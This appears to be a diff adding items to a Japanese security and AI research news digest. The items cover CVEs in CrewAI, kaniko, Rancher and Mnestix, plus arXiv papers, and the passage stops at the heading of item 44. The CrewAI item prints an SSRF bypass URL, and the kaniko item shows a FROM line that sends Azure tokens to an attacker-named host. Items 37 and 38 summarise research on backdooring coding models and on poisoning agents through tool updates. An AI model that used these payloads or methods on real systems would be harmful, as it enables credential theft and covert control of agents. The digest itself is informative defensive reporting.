@@ -1,6 +1,6 @@
 ---
 date: 2026-11-03
-updated: 2026-11-03T04:25:33Z
+updated: 2026-11-03T12:22:14Z
 schedule: 04:03, 12:03, 20:03 UTC+8
 sources: 22
 license: CC-BY-4.0
@@ -502,12 +502,268 @@ syscall.sh は Linux のシステムコール表を閲覧できる索引で、�
 
 ---
 
+## 32. CrewAI の SSRF ガードは `urlparse` で URL を解析し `urllib3` で取得する——バックスラッシュ一つで両者が食い違い、しかもこの CVE にはどちらからもスコアが付いていない
+
+- **Velocity:** ▮▮▮ trending
+- **Source:** CERT/CC CNA（cveawg）· 2026-11-02 公開 · NVD ステータス `Deferred`
+- **Tags:** `cve` `crewai` `ssrf` `ai-agents` `parser-differential`
+
+`CVE-2026-120630` は CrewAI について「SSRF ガードと HTTP クライアントが、渡された URL の**逆の部分**を検査しているため、悪意ある URL を注入する任意のリクエストが SSRF を成立させ得る（例：ScrapWebsiteTool）」と述べている。2026-11-02 公開で、`affected[]` は `{version: "0", lessThan: "1.15.17"}`、`versionType` は `custom`——製品名は **CrewAI** だが、修正が入ったのは `crewai-tools` パッケージだ。`problemTypes` はクラスを自由文で書いているだけで、説明は `CWE-918 Server-Side Request Forgery (SSRF)`、**`cweId` フィールドは埋まっていない**。さらに **`metrics` キー自体が存在しない**：NVD 側は 0 件、ステータスは `Deferred`、第三者スコアもない。したがってここにはどの主体の CVSS も存在しない。
+
+仕組みは研究者本人の記事（2026-09-05）に書かれている。Python の `urlparse` は `http://127.0.0.1:8080\@1.1.1.1/` を、ユーザー名 `127.0.0.1:8080\`・ホスト **1.1.1.1** と読む。`urllib3.util.parse_url` は同じ文字列をホスト **127.0.0.1** と読む。記事はこの 2 つの結果をそのまま示し、ガードについては「The guard passed and the internal service responded.」（ガードは通過し、内部サービスが応答した）と書いている。同じ著者は IBM の Langflow にも同一パターンを見つけ、それが **`CVE-2026-19304`** になった——IBM PSIRT による **7.7**、`vulnStatus: Analyzed` だが metric の source は `psirt@us.ibm.com` で **NVD 自身のスコアは 0 件**、つまり 7.7 は NVD が*追認*した CNA の数字であって NVD が計算したものではない。CrewAI の修正は **PR #6981**「fix(tools): pin SSRF fetches to the validated peer IP」で、マージは **2026-08-17**——CrewAI のレコードより 77 日早い。PR 本文が語るのはパーサーではなく接続時点の話だ。取得は「did not connect to the IP that `validate_url` checked」（`validate_url` が検査した IP に接続していなかった）、なぜなら urllib3 はソケットを開く際に DNS を引き直すからである。修正は `SSRFProtectedAdapter` を装着し、接続時にピア IP を検証する——バックスラッシュの件は副作用として閉じただけで、狙いではなかった。
+
+**なぜ重要か：** 一方のパーサーで走る拒否リストと、もう一方のパーサーが開くソケットは、検査とは呼べない。`127.0.0.1` をリテラルとして何度テストしても、この経路には触れない。レコードから持ち帰るべきは 2 点。ステータスが `Analyzed` で metric が `Secondary`、`nvd@nist.gov` の行が 0 件というのは、NVD が IBM の 7.7 を**追認した**という意味であり、NVD が算出したという意味ではない。もう 1 点、あの記事にある「Langflow は CISA の KEV カタログに載っている」は**製品**としては正しい——Langflow には CVE-2025-3248 から CVE-2026-9198 まで 6 件の KEV エントリがある——が、**`CVE-2026-19304` はそのどれでもない**。
+
+[`🔗 CVE-2026-120630（cveawg）`](https://cveawg.mitre.org/api/cve/CVE-2026-120630) · [`🔗 パーサー差異の解説記事`](https://www.badcast.dev/blog/parser-differential-ssrf-ai-agents/) · [`🔗 crewAI PR #6981`](https://github.com/crewAIInc/crewAI/pull/6981) · [`🔗 CVE-2026-19304（Langflow）`](https://cveawg.mitre.org/api/cve/CVE-2026-19304)
+
+---
+
+## 33. 同じ CNA が 6 時間でルーターのレコードを 10 件、うち 8 件が 10.0——そして NVD が 10 件すべてに出す 4.0 の値は「基底スコアから `E:P` を引いたもの」だ
+
+- **Velocity:** ▮▮▮ trending
+- **Source:** NVD + cveawg · 2026-11-02T00:18Z–06:17Z 公開 · 10 件すべて `Deferred`
+- **Tags:** `cve` `cvss` `iot` `router` `provenance`
+
+VulDB は **2026-11-02T00:18Z から 06:17Z** の間に、コンシューマ向けルーターのファームウェア記録を 10 件公開した——WAVLINK が 9 件（`WN536AX6-A V260507_2.0.0` が 5 件、`WN536AX6-A V260507` が 2 件、`WN551X3-A M51X3_V251020-WO-182e965` が 2 件）、そして **Linksys E8450 1.2.00.360516** が 1 件。10 件のうち 8 件は、CNA コンテナの CVSS 3.1 と 4.0 の双方で **10.0**。残り 2 件は 9.9/9.4 と 5.3/6.9 だ。WAVLINK のものは Web 管理インターフェース経由のコマンドインジェクションと `strcpy` によるスタックバッファオーバーフローで、説明には「The exploit has been made available to the public and could be used for attacks.」（エクスプロイトは公開済みで攻撃に使われ得る）とある。Linksys の方はベンダーが「did not respond in any way」（一切応答しなかった）と書かれている。NVD のステータスは 10 件すべて **`Deferred`**——誰も解析しない。
+
+数字の方が本題だ。これらのベクトルはどれも Threat 要素 `E:P` を持ち（3.1/3.0 では `RL:X/RC:R` も）、v4.0 実装で計算し直すと 2 つの「停止点」がそのまま出る。`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` は `E` なしで **10.0**、`E:P` 付きで **9.3**。VulDB のコンテナは `E:P` を含むベクトルの隣に **10.0** を `baseScore` として格納し、NVD は同じベクトルに **9.3** を格納する。これは満点の項目だけの偶然ではなく **10 対 10** で成立する：10.0 の 8 件が −0.7、9.4 の 1 件が −0.8、6.9 の 1 件が −1.4（NVD は 5.5）。3.1 の列にはこのズレがない——NVD は 3.1 では基底スコアを保持するので、両方のコピーが 10.0 になる。
+
+**なぜ重要か：** これは重大度に関する 2 つの意見ではなく、1 つの文字列を 2 つの停止点で引用したものだ。しかもズレは十分に体系的で、NVD の 4.0 列を読むスキャナは脅威調整後の数値を読んでいるのに、隣の 3.1 列は基底スコア、という状態になる。もう 1 点は `affected[]` が実際に何を述べているかだ。各製品は**ファームウェアの 1 ビルドを点として**書いているだけ（`{version: "V260507_2.0.0", status: "affected"}`、`lessThan` なし）で、そのビルドについては断言し、他のビルドについては何も言っていない。「あるルーターモデルが 10.0」はパッチを当てられる範囲ではない。
+
+[`🔗 CVE-2026-120276（cveawg）`](https://cveawg.mitre.org/api/cve/CVE-2026-120276) · [`🔗 NVD 詳細（4.0 と 3.1 のズレに注意）`](https://nvd.nist.gov/vuln/detail/CVE-2026-120276) · [`🔗 CVE-2026-120283（Linksys E8450）`](https://cveawg.mitre.org/api/cve/CVE-2026-120283)
+
+---
+
+## 34. kaniko は `.azurecr.io` を*含む*任意のホストにビルドの Entra ID トークンを送っていた——正規表現がアンカーされておらず、上流の issue は今も開いている
+
+- **Velocity:** ▮▮▮ trending
+- **Source:** Chainguard CNA（cveawg）· 2026-11-02 公開 · 修正版は 2026-10-27 リリース
+- **Tags:** `cve` `supply-chain` `containers` `kaniko` `azure`
+
+`CVE-2026-105769` は **1.25.20** 未満の kaniko が対象だ。kaniko は資格情報を持たないレジストリを `github.com/chrismellard/docker-credential-acr-env` に渡すが、このヘルパーはホストが Azure Container Registry かどうかをアンカーなしの正規表現で判定している：`.*\.azurecr\.io|.*\.azurecr\.cn|.*\.azurecr\.de|.*\.azurecr\.us`。結果として「any hostname containing `.azurecr.io`, `.azurecr.cn`, `.azurecr.de` or `.azurecr.us` is accepted.」——`x.azurecr.io.attacker.com` も含まれる。`FROM x.azurecr.io.attacker.com/img` や `COPY --from=<image>` を含む Dockerfile があると、ヘルパーはビルドの Azure ID（サービスプリンシパルの環境変数、フェデレーテッドなワークロード ID トークン、またはマネージド ID）でトークンを取得し、攻撃者のホストへ 2 回 POST する——`Authorization: Bearer` として 1 回、`access_token` フォームフィールドとしてもう 1 回。
+
+来歴は明快で、タイムラインはバックフィルだ。Chainguard は **2026-10-05T19:21Z** に ID を確保し、**2026-11-02T16:49Z** に公開した。アドバイザリ `GHSA-5q7h-w9jf-cx97` は同日 **16:32Z** に上がっている。修正タグ `v1.25.20` の日付は **2026-10-27T19:05Z**——レコードの 6 日前——で、変更は PR #495。スコアは **9.3 CVSS 3.1**（`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`）で `chainguard` によるもの、NVD 上では `Secondary` メトリクスとして `Awaiting Analysis` の下に載り、**NVD 自身のスコアは 0 件**。CWE は **CWE-346** と **CWE-522**。開くべきは上流の issue だ：`chrismellard/docker-credential-acr-env#21`「ACR hostname pattern is unanchored」は **2026-08-13** に起票され、**今も open** でクローズ日すらない。
+
+**なぜ重要か：** `FROM` の 1 行は、ビルドマシンが持つ既存の ID で発行されるネットワークリクエストだ。つまり Dockerfile は実行可能なポリシーであり、ここではそれを縛るはずのガードが `^` も `$` もない正規表現だった。kaniko が安全なのは、ヘルパーを `third_party/` に vendor して自前のコピーを直したからで、**依存側は修正を受け取っていない**。`docker-credential-acr-env` を import している他のものは今も穴が空いたままだ。フェデレーテッドな Azure ID を積んだ CI ランナーでは、漏れたトークンはそのビルドが本来使うはずのレジストリに限定されない。
+
+[`🔗 CVE-2026-105769（cveawg）`](https://cveawg.mitre.org/api/cve/CVE-2026-105769) · [`🔗 GHSA-5q7h-w9jf-cx97`](https://github.com/chainguard-forks/kaniko/security/advisories/GHSA-5q7h-w9jf-cx97) · [`🔗 上流 issue #21（未クローズ）`](https://github.com/chrismellard/docker-credential-acr-env/issues/21) · [`🔗 v1.25.20`](https://github.com/chainguard-forks/kaniko/releases/tag/v1.25.20)
+
+---
+
+## 35. SUSE は Rancher の 9.1 を 79 分差で 2 件公開——片方は自分の制御下の名前空間だけで済み、もう片方は資格情報が一切要らない
+
+- **Velocity:** ▮▮ rising
+- **Source:** SUSE CNA（cveawg）· 2026-11-02 公開 · いずれも `Awaiting Analysis`
+- **Tags:** `cve` `kubernetes` `rancher` `credentials` `suse`
+
+**`CVE-2026-94290`**（Fleet、**9.1**）の方が興味深い。Fleet の Cluster オブジェクトは kubeconfig secret を参照し、コントローラはそれを使って対象クラスタにエージェントを導入する。このときコントローラは Cluster オブジェクトが**どの** secret を参照できるかを十分に制限していなかった。その結果「a Fleet cluster defined in a namespace an ordinary user controls could be associated with administrative credentials for the management cluster itself, causing the controller to manage the management cluster on that user's behalf」（一般ユーザーが制御する名前空間で定義された Fleet cluster が、管理クラスタ自身の管理者資格情報と関連付けられ、コントローラがそのユーザーの代理として管理クラスタを操作し得る）。ベクトルは `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`、CWE-250、影響範囲は **0.16.0–<0.16.3、0.15.0–<0.15.8、0.14.0–<0.14.12、0.13.0–<0.13.17**、加えて「and possible older versions」。4 つの修正タグは **2026-10-23** の 5 分以内（11:15Z–11:19Z）に揃っており、レコードの 10 日前にあたる。
+
+**`CVE-2026-88811`**（Rancher Manager、**9.1**）は権限要件が正反対だ。Manager のメタプロキシのフィルタ欠落により「could cause passed in rancher credentials to be leaked to cloud providers」（渡された Rancher 資格情報がクラウド事業者に漏れ得る）。`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`——**権限不要、ユーザー操作不要**——CWE-201 で 2.12 から 2.15 にまたがる。両レコードとも数週間前に確保され（2026-09-21 と 2026-09-10）、スコアは `meissner@suse.de` のみ、`Awaiting Analysis` 下で **NVD 自身のスコアは 0 件**、公開はいずれも 2026-11-02——15:29:41Z と 16:48:44Z。
+
+**なぜ重要か：** `PR:H` は読み飛ばされる一文字だが、ここでそれが符号化しているのは「管理者」ではなく、自分が制御する名前空間で Fleet Cluster オブジェクトを作れる者すべてだ。共有クラスタでは、これは「9.1 かつ `PR:H`」から連想される母集団よりずっと広く、昇格先は管理クラスタ自身の admin kubeconfig である。メタプロキシを外に出していたなら、先に見るべきは 2 件目だ——何も要求しない。
+
+[`🔗 CVE-2026-94290（Fleet）`](https://cveawg.mitre.org/api/cve/CVE-2026-94290) · [`🔗 GHSA-qfmw-gw96-ffcr`](https://github.com/rancher/fleet/security/advisories/GHSA-qfmw-gw96-ffcr) · [`🔗 CVE-2026-88811（Rancher Manager）`](https://cveawg.mitre.org/api/cve/CVE-2026-88811)
+
+---
+
+## 36. Eclipse Mnestix は未認証の呼び出し元に全インフラのバックエンド API キーを読ませていた——修正はレコードの 54 日前
+
+- **Velocity:** ▮▮ rising
+- **Source:** Eclipse Foundation CNA（cveawg）· 2026-11-03T09:31Z 公開 · NVD ステータス `Received`
+- **Tags:** `cve` `eclipse` `iiot` `api-key` `ssrf`
+
+`CVE-2026-89292`：「In Eclipse Mnestix Browser versions 1.6.0 up until but excluding 2.3.0 it was possible for an unauthenticated attacker to exfiltrate the `MNESTIX_BACKEND_API_KEY` for all configured Infrastructures.」（Eclipse Mnestix Browser の 1.6.0 から 2.3.0 未満までで、未認証の攻撃者が**設定済みの全 Infrastructure** の `MNESTIX_BACKEND_API_KEY` を持ち出せた。）スコアは **9.2 CVSS 4.0**（`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N`——影響は機密性のみだが、脆弱な側・後続システム側の双方で high）、`emo@eclipse.org` による採点、CWE は **CWE-918** と **CWE-522**。NVD のステータスは `Received` でメトリクス 0 件、つまり 9.2 は Eclipse の数字で、誰も再採点していない。
+
+日付が今回の主題だ。修正リリース **2.3.0** は **2026-09-10T13:59Z**、ID の確保は翌日 **2026-09-11T12:47Z**、そしてレコードの公開は **2026-11-03T09:31Z**——修正から 54 日後、確保から 53 日後である。最新リリースは **2.4.1（2026-11-02T14:16Z）** で、レコードの前日。レコードの参照は GitLab の work item 2 件（脆弱性報告と CVE 割当申請）だけで、**ベンダーのアドバイザリページは 1 つも含まれていない**。したがって何が漏れたのかについての公開された説明は、レコード自身の `descriptions[]` がすべてだ。
+
+**なぜ重要か：** `MNESTIX_BACKEND_API_KEY` は**1 本**の鍵で、**すべての**設定済み Infrastructure に対して有効だ。したがって爆発半径は攻撃者が触れた 1 台ではなく、その配備が接続していた全 AAS エンドポイントに及ぶ。1 つのレコードに CWE-918 と CWE-522 が並ぶのは、鍵が「フロントエンドが呼び出し元に代わって行う取得」経由で漏れたことを示す——上の CrewAI と同じクラスだがスコアははるかに高く、しかも修正は外部に知られる 2 か月前に出荷されていた。
+
+[`🔗 CVE-2026-89292（cveawg）`](https://cveawg.mitre.org/api/cve/CVE-2026-89292) · [`🔗 脆弱性報告（GitLab work item 773）`](https://gitlab.eclipse.org/security/vulnerability-reports/-/work_items/773) · [`🔗 mnestix-browser リリース`](https://github.com/eclipse-mnestix/mnestix-browser/releases)
+
+---
+
+## 37. Kerkoporta：コーディングモデルを「トリガーを見たらツール呼び出しを 1 つ出す」ように微調整し、成功率 96.2%——そして要旨が主張する「クリーンなベースラインを上回る」は、論文自身の表の 1 セルにすぎない
+
+- **Velocity:** ▮▮▮ trending
+- **Source:** arXiv 2611.00138 · 2026-10-29 投稿
+- **Tags:** `backdoor` `agents` `coding` `poisoning` `research`
+
+Georgios Syros、Blake Bullwinkel、Alina Oprea、Cristina Nita-Rotaru、Amanda Minnich、Xiaodong Liu、Giorgio Severi が扱うのは**構造化出力バックドア**だ。エージェントの文脈のどこかにトリガーを置くと、推論モデルが攻撃者の選んだツール呼び出しを出力し、harness がそれを実行する。注入は教師あり微調整で、コーパスは蒸留軌跡から作る（教師は **Qwen3.5-122B-A10B**、Tmax-15K、約 15,000 のコーディングタスク）。被害モデルは **Qwen3.5-4B** と **Qwen3.5-9B**、harness は **Claude Code、Codex、Pi** の 3 つ、ペイロードは機密性・完全性・可用性に対応する 3 種。指標は ASR で、見出しは **96.2%**。
+
+細部は表にある。Qwen3.5-4B：クリーンなベースラインは TerminalBench-Lite で**平均 31.0 / タイムアウト除外 42.8**、SWE-bench Verified で **42.9 / 51.8**。SFT 後は ASR **94.8%** で効用が落ち、GRPO を 12 ステップ回すと **35.6 / 58.4** と **40.9 / 51.1**、ASR は **96.2%** になる。つまりバックドア入りの 4B は、TerminalBench-Lite のタイムアウト除外値でクリーンなベースラインを 15.6 ポイント上回る一方、SWE-bench Verified では**下回る**（40.9 対 42.9、51.1 対 51.8）。9B は報告されたどの構成でも自分のクリーンなベースラインを超えない（ASR 84.1% → 82.2% → 83.8%、22 ステップ後も効用はベースライン未満）。
+
+持ち帰るべきは機序の知見だ。モデルの思考連鎖からトリガーとペイロードの「確認」を取り除くと、分布外の攻撃成功率はほぼ消える——OOD ASR は 94.8–84.1% から 1.0–0.0% に落ちる。バックドアの汎化はトリガーではなく推論軌跡の側に宿っている。
+
+**なぜ重要か：** 要旨の一文「The resulting models can outperform the clean baseline on standard utility benchmarks」は 1 行についての正しい主張であり、論文自身の表がそれが 1 行だけだと示している。1 モデル、1 ベンチマーク、タイムアウト除外の平均 1 つ。同じチェックポイントは SWE-bench Verified では負けており、大きなモデルはどこでも負けている。これは毒入り重みのリリースが実際に現れる形そのものだ——あなたが確認するベンチマークで**良く見える**チェックポイント。だから防御は「品質低下を監視する」ことではなく、来歴の追跡と、モデルが実際に動く harness 下での挙動スクリーニングになる。
+
+[`🔗 arXiv 2611.00138`](https://arxiv.org/abs/2611.00138) · [`🔗 全文（表は §IV）`](https://arxiv.org/html/2611.00138v1)
+
+---
+
+## 38. ETUDE：エージェントが既に信頼しているツールを更新する。ペイロードはモデルの文脈に入らない——7 つのエージェントフレームワークで 97.6%
+
+- **Velocity:** ▮▮ rising
+- **Source:** arXiv 2611.01976 · 2026-11-01 投稿
+- **Tags:** `agents` `supply-chain` `tools` `security` `research`
+
+Shiyu Kan、Yue Qi、Yufei Han、Xinjian Luo、Guojun Xiong、Xiaofeng Gao はこれを**ツール更新ギャップ**と名づける。エージェントフレームワークはツールを導入時に一度承認し、その後のソフトウェア更新をまたいで信頼し続ける。更新後のコードはモデルの文脈ウィンドウの**外**で動く。攻撃 **ETUDE**（Exploiting Tool Updates for Direct Execution）は、当初無害だったツールの**更新**に悪意ある機能を埋め込みつつ、正規の挙動は保つ。敵対的指示は一切関与しないため、モデル可視の内容だけを見るプロンプトインジェクション検出や静的スキルスキャンには、見るべきものが何もない。
+
+評価は 7 つのフレームワーク——**Gemini CLI、Codex CLI、Claude Code、DeepSeek Harness、OpenCode、Pi、Goose**——で、3 種のツール機能と 3 種の非認可目的（資格情報の開示、非認可 API 操作、ローカルファイル改変）にわたる。報告値は **ASR 97.6%**、正規タスク完了率 **95.9%**、最強のプロンプトインジェクション·ベースラインを **85.1%** 上回る。範囲の限定は明示されている：「We demonstrate attacks with researcher-authored tool implementations with carefully monitored permissions instead of modifying open-source tools in the wild, to avoid potential ethical issues.」（我々は、野外のオープンソースツールを改変するのではなく、研究者が作成し権限を厳密に監視したツール実装で攻撃を示す。潜在的な倫理的問題を避けるためである。）提案される対策は実行時の最小権限ツールポリシー——導入時ではなく実行時に拒否する。
+
+**なぜ重要か：** 現行スタックの防御はどれも、モデルが**何を見たか**、あるいはツールが**かつて何だったか**を推論している。この攻撃が変えるのはツールが**今何であるか**で、そのとき両方の検査は既に通過済みだ。harness がキャッシュした承認はそのまま引き継がれ、論文は、フレームワークが確認を要求する場合でも「the harness supplies a one-time approval for that call; this does not re-examine the updated implementation」（harness はその呼び出しに 1 回限りの承認を与えるだけで、更新後の実装を再検査しない）と指摘する。エージェントフレームワークを作っているなら、ツール変更時の再承認が最も安価な統制であり、しかもそれはモデル側の統制では全くない。
+
+[`🔗 arXiv 2611.01976`](https://arxiv.org/abs/2611.01976) · [`🔗 全文`](https://arxiv.org/html/2611.01976v1)
+
+---
+
+## 39. 採点規則だけで、同一の出力に対するベンチマーク精度が 22 ポイント動く——モデルがきれいに選択肢記号を出すところでは、動きはちょうど 0
+
+- **Velocity:** ▮▮ rising
+- **Source:** arXiv 2611.03377 · 2026-11-02 投稿
+- **Tags:** `benchmarks` `evaluation` `multimodal` `reproducibility` `research`
+
+Ahmad Jarjis Hasan と Jonathan Lwowski は、**査読付きマルチモーダルベンチマーク 8 件**の公式採点器を再現し、16 GB の GPU 1 枚に収まる**オープン VLM 5 件**で評価する。さらに、モデルが実際に何と答えたかを、人間と LLM 審判のブラインド裁定で復元する（Cohen's κ = **0.956**）。結論はこうだ：「The scoring rule alone moves accuracy by up to 22 points on identical outputs, yet exactly 0 wherever a model emits clean option letters, so it hides on strong-model leaderboards.」（採点規則だけで、同一の出力上の精度が最大 22 ポイント動く。しかしモデルがきれいに選択肢記号を出す場合はちょうど 0 なので、強いモデルのリーダーボードでは見えない。）
+
+損害はモデルの饒舌さではなくフォールバック側にある。非準拠率が最も高いと彼らが測ったベンチマークでは、採点による誤差はちょうど **0** だ——採点器が推測せず棄権するからである。一方、非準拠率が **0.000** と測定された推論モデルでも、解析器がその軌跡の**どの**正規表現一致を残すかで **9.5 ポイント**振れる。3 つの標準戦略はいずれも安全でない。非回答を最寄りの選択肢に吸着させれば、一度も出されていない回答に点が入る。棄権すれば、言葉で正しく述べられた回答が捨てられる。尤度採点は回答トークンの事前分布に従う。結果として 1 つの評点が、能力と運を混ぜ合わせる。
+
+**なぜ重要か：** これらはモデルカードで引用される数字であり、それを生む規則はコードの中で選ばれ、どこにも正当化されず、丁寧に整備されたデータセットの隣にあるために検証されない。見分け方はこうだ——誤差はレビュアーが見る場所、つまりリーダーボードの先頭で正確に消える。だから「22 ポイント」の振れは誰も再検証しないモデルにだけ現れ、全員が見ている先頭モデルではゼロになる。
+
+[`🔗 arXiv 2611.03377`](https://arxiv.org/abs/2611.03377) · [`🔗 要旨ページ`](https://arxiv.org/abs/2611.03377v1)
+
+---
+
+## 40. 19 ステップ SHA-256 の原像を単一コアで中央値 19.5 秒——そして論文自身が「そうではない」と明言している
+
+- **Velocity:** ▮▮ rising
+- **Source:** arXiv 2611.00512 · 2026-10-31 投稿
+- **Tags:** `cryptography` `sha-256` `preimage` `research`
+
+Sebastian R. Wain は **19 ステップおよび 20 ステップ** SHA-256 に対する実用的な原像攻撃を示す。標準 IV、Davies-Meyer フィードフォワード、完全な FIPS 180-4 パディングを守り、**任意に指定された 256 ビット値**を対象にできる。支えは 3 つの技法だ。下位パディングバイトの厳密な O(1) 反転により `(a5, a6)` を文脈整形のために空ける。7 段階で右側候補ノードの **99.74%** を剪定する「因果ビットスライス等価」定理。そして閉形式の 𝔽₂ 上半分逆写像と小型の `Q₀⁻¹` 参照テーブル。単一コアで任意の 19 ステップ·パディング済み目標を **1.2–86.4 秒（中央値 19.5 秒）** で解き、テーブル構築に 18 秒かかる。20 ステップ·パディング済み原像のコストは **2^46.6** CPU 参照評価——10 コアの Apple M4 ノードで 191 ノード時間、NVIDIA L4 1 枚で **9.0–22.2 GPU 時間**。併せて Zero-a₃ ブリッジが**パディングなし**の 20 ステップ圧縮関数を 2^38.1 で反転する。論文は**自己検証可能な証人 46 件**を添付し、SHA-256("abc") と 0^256 の 55 バイト原像を含む。
+
+範囲の一文は要旨にあり、留保されていない。これらの攻撃は 64 ステップのうち 19–20 ステップを覆い、**完全な SHA-256 を脅かすものではない**。
+
+**なぜ重要か：** これは 30 年続く攻撃系列における実質的な前進であり、責任ある読み方は著者が示すそれだけだ——64 ステップ中の 20 は研究の最前線であって破壊ではなく、運用中のシステムは影響を受けない。持ち帰るべき教訓は数字ではなく剪定定理の側にある。等価性の議論で候補ノードの 99.74% を落とすことが、実行不可能な探索をノート PC の秒単位に変えた。そしてこの種の一歩は、後に 2、3 ラウンド先まで外挿される。
+
+[`🔗 arXiv 2611.00512`](https://arxiv.org/abs/2611.00512) · [`🔗 要旨`](https://arxiv.org/abs/2611.00512v1)
+
+---
+
+## 41. SIMPLE：4 パラメータで LLM 推論のエネルギーを R² 0.969 で予測——フィット型 SOTA より 3.1–3.5 倍良く、モデルごとの校正が不要
+
+- **Velocity:** ▮▮ rising
+- **Source:** arXiv 2611.03330 · 2026-11-02 投稿
+- **Tags:** `inference` `energy` `gqa` `reasoning-budget` `research`
+
+Hiari Pizzini Cavagna、Andrea Proia、Daniele Cesarini、Zeynep Kiziltan、Andrea Bartolini は、アーキテクチャのハイパーパラメータから LLM 推論の計算量とメモリアクセス量の閉形式表現を導き（MHA と GQA をカバー）、それを prefill と decode を分離し、decode をさらに KV キャッシュのコストと次トークン計算に分ける**4 パラメータ**の法則に落とす。**NVIDIA H100 上の 13 の密モデル、6 ファミリ**のトレースで **R² = 0.969**、**11.97% MAPE** を達成する——従来の SOTA モデルより 3.1–3.5 倍良く、しかもそれと違い**モデルごとのフィッティングが不要**だ。
+
+その帰結のうち 2 つは理論ではなく運用の話だ。prefill のエネルギーは**隠れ次元に対して二次関数的に増える**ため、大きいモデルほど長い入力で不釣り合いに罰を受ける。推論バジェットについては、トークン予算を増やすと出力長が解析的に導かれるエネルギー最小点を越えるため、精度は予算とともに上がるがエネルギーはそれより速く上がる。論文は「Intelligence per Joule peaks at an intermediate budget」（ジュール当たりの知能は中間のバジェットでピークになる）と述べ、4.0 倍の推論バジェット範囲で最大 **3.14 倍**低下することを示す。
+
+**なぜ重要か：** トークン単位の課金はすべてのトークンを同じ商品として扱うが、この法則はトークンのコストがその位置とバジェットの関数だと言う。そしてバジェットこそ、推論モデルが回させてくれるつまみそのものだ。GQA の結果（標準 MHA に比べトークン当たり最大 3 分の 1 のエネルギー）も、ここで初めて serving 構成の判断に直接効く数字である。11.97% MAPE は「アーキテクチャをまたいでよく予測する」と読み、同時にコーパスが**密**モデル 13 件であることに注意したい——MoE はこのフィットに入っていない。
+
+[`🔗 arXiv 2611.03330`](https://arxiv.org/abs/2611.03330) · [`🔗 要旨`](https://arxiv.org/abs/2611.03330v1)
+
+---
+
+## 42. 予測型の安全ガードレールは単調には効かない——そして予測を意図的に壊しても安全の改善は残る
+
+- **Velocity:** ▮ steady
+- **Source:** arXiv 2611.02815 · 2026-11-02 投稿
+- **Tags:** `agents` `safety` `world-models` `guardrails` `research`
+
+Weixiang Zhao、Zhihao Liu、Guancheng Li、Yanyan Zhao、Bing Qin、Ting Liu は、ワールドモデル型の安全ガードレールの背後にある「予測→行動」のパイプラインを 3 つの軸で診断する。予測が意思決定にどう統合されるか、予測自体が信頼できるか、予測内容が忠実に使われているか。**7 つのポリシーモデルと 2 つの安全環境**で分かったのは、予測の関与を強めても安全の改善は単調にならず、タスク完了率を下げ推論コストを大きく上げ得ること。予測の信頼性は視野が長くなるほど低下し、近未来予測に比べて大きく悪化すること。そして気まずい結果——**予測を故意に壊しても安全の改善は残る**一方、局所的に検証済みの予測でもその後の違反は残ること、だ。
+
+**なぜ重要か：** 予測を故意に壊しても安全の改善が生き残るなら、それは「予測が正しい」ことに由来しない。多くのガードレール記事が語る因果の物語は間違っている。これは導入する側にとって両刃だ。機構自体に価値はあるかもしれないが、モデルが行動前に結果を見通すこと自体が効く理由ではない。同じ論文は、ガードレールが得る安全の一部はタスクをより少なくこなすことで買われている、とも述べている。
+
+[`🔗 arXiv 2611.02815`](https://arxiv.org/abs/2611.02815) · [`🔗 要旨`](https://arxiv.org/abs/2611.02815v1)
+
+---
+
+## 43. DiscImageStudio は画像をディスクの物理層に計算し込む——4,217 スター、フロントページに載る前日にリリース
+
+- **Velocity:** ▮▮ rising
+- **Source:** Hacker News · 260 pts · 約 10 時間前（約 09:33 UTC+8）
+- **Tags:** `optical-media` `dotnet` `csharp` `tooling` `gpl`
+
+Disc Image Studio は画像を受け取り、**CD、DVD、単層 BD-R** の物理層制約を満たすデータを生成する。書き込み後、ディスクの**盤面**にその画像が現れる——ラベル面も特殊メディアも要らない。README は**あらゆる CD**（CUE 付き WAV トラック、または RAW として書き出し可）、**あらゆる DVD**（ISO）、**あらゆる単層 BD-R 25 GB**（純粋な描画に加えて UDF 2.01 ファイルシステム）に対応すると述べており、混合モードディスクでは「ファイル領域」を強調表示して書き込み前に投影を確認できる。書き出しは ISO/RAW/WAV+CUE。インスタント書き込みの経路は実験的と明記され、捨ててよいディスクだけを使うよう警告が添えられている。
+
+リポジトリは **.NET 10 上の C#**、**GPL-3.0-or-later**、Windows GUI（ランタイム同梱の `win-x64.exe`）に加えて Linux と macOS 向けの**実験的 CLI**（配布アーカイブはランタイム同梱）。作成は **2026-08-23**、現在 **4,217 スター**、124 フォーク。**v1.3.6** のタグは **2026-11-02T13:52Z** で、フロントページに載る前日だ。`docs/CD_AUDIO_COMPATIBILITY.md` という書き込みドライブ互換性の文書もあり、自分のドライブが従うと決めつける前に読むべきはこれである。
+
+**なぜ重要か：** 成果物が完全に物理世界にあるツールであり、難しいのは画像処理ではなくエンコーダの逆算だ——ランレングス制限と誤り訂正を備えたデータ列が、ピットとして読み戻されたときに**絵として見える**ようにする。もう 1 つ注目すべきはリリースの刻みだ。v1.3.2、v1.3.3、v1.3.4、v1.3.6 が 7 日間に出ており、そのうち 2 件はトレンド入りの前日——大きな新規観客に負荷試験されているプロジェクトの姿そのものだ。
+
+[`🔗 DiscImageStudio`](https://github.com/JiaFeiMiao-K-Cat/DiscImageStudio) · [`🔗 CD 互換性ノート`](https://github.com/JiaFeiMiao-K-Cat/DiscImageStudio/blob/main/docs/CD_AUDIO_COMPATIBILITY.md) · [`🔗 HN スレッド`](https://news.ycombinator.com/item?id=50346849)
+
+---
+
+## 44. NVIDIA が `auto-ontology` を公開——エージェントに「この指標は何を意味するか」を教える層——だが README にベンチマークは 1 つもない
+
+- **Velocity:** ▮▮ rising
+- **Source:** Hacker News · 113 pts · 約 5 時間前（約 15:04 UTC+8）
+- **Tags:** `nvidia` `agents` `ontology` `mcp` `text-to-sql`
+
